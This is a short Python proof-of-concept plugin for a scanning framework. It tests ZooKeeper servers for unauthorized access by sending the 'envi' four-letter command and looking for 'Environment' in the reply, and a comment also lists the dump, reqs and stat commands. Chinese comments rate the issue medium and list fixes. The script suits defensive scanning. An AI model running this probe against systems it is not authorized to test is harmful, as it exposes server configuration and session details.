#!/usr/bin/env python
# -*- coding:utf-8 -*-

'''
    name: zookeeper未授权访问
    level: 中危
    type: 未授权访问
    repair: 1、如果为本机使用，仅监听127.0.0.1  
            2、使用主机防火墙或zookeeper本身来限制源IP地址的访问
            3、使用用户名/密码认证
'''

import socket
from POC_Framework import POC

class myPOC(POC):
    
    #单IP的POC
    def check(self, ip, port, timeout=5):
        try:
            socket.setdefaulttimeout(timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            # flag = envi|envi|dump|reqs|ruok|stat
            flag = 'envi'
            s.send(flag)
            data = s.recv(2048)
            s.close()
            if 'Environment' in data:
                return True
        except:
            return False

if __name__ == "__main__":

    Check_POC = myPOC()
    Check_POC.run()